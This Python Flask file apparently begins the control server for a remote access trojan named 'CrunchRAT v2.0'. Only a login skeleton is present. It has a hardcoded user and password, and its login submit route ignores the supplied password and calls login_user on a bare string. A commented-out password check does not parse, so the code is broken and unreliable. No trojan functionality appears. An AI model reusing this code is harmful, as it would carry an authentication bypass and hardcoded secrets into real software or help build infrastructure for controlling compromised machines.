import argparse
from flask import Flask
from flask import request
from flask import redirect
from flask import render_template
from flask import session
from flask_login import LoginManager
from flask_login import UserMixin
from flask_login import login_required
from flask_login import login_user
from flask_login import logout_user
from flask_login import current_user
from gevent.wsgi import WSGIServer
import os

# creates Flask application instance
app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(32)

# creates Flask-Login instance
login_manager = LoginManager()
login_manager.session_protection = "strong"
login_manager.init_app(app)


class User(UserMixin):
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def is_authenticated(self):
        return True


@login_manager.user_loader
def load_user(username):
     # 1. Fetch against the database a user by `id`
     # 2. Create a new object of `User` class and return it.
     #u = DBUsers.query.get(id)
    #return User(u.name,u.id,u.active)
    return User("hunter", "super_secret_password")



# HTTP 403
@app.errorhandler(403)
def forbidden(e):
    return render_template("403.html"), 403


# HTTP 404
@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html"), 404


# HTTP 500
@app.errorhandler(500)
def internal_server_error(e):
    return render_template("500.html"), 500


# redirects all HTTP GET / requests to /login
@app.route("/", methods=["GET"])
def index():
    return redirect("/login", 302)


# Login page
@app.route("/login", methods=["GET"])
def login():
    return render_template("login.html"), 200


# Login form submit function
@app.route("/loginSubmit", methods=["POST"])
def login_submit():
    username = request.form["username"]
    password = request.form["password"]

    login_user("hunter")
'''
    if request.form["password"] == args.password:
        login_user(("hunter")
        return "successful authentication"

    else:
        return "failed authentication"
'''


@app.route("/home")
@login_required
def home():
    pass





if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="server.py",
                                     description="CrunchRAT v2.0")
    parser.add_argument("password",
                        action="store",
                        type=str,
                        help="server password")

    # parses command-line arguments
    args = parser.parse_args()

    logged_in = None

    # starts Flask listener
    server = WSGIServer(("0.0.0.0", 80), app)
    server.serve_forever()
